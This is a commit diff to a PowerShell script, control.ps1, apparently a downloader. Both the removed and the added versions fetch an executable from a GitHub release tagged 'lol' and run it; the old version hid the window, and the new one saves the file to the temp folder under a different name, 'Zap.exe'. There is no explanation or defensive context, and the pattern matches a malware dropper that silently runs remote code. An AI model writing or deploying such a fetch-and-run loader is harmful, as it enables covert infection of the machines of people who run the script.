d611ee31ceb64aa400d50f62c935a11780974460
kilordow <petrovolosuk310@gmail.com>
2026-02-25 21:39:33 +0200

    Update control.ps1

--- control.ps1
+++ control.ps1
@@ -1,5 +1,3 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe"; .\chekir.dll
-
-Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
-
-
+$p="$env:TEMP\Zap.exe"
+iwr https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe -o $p
+Start-Process $p
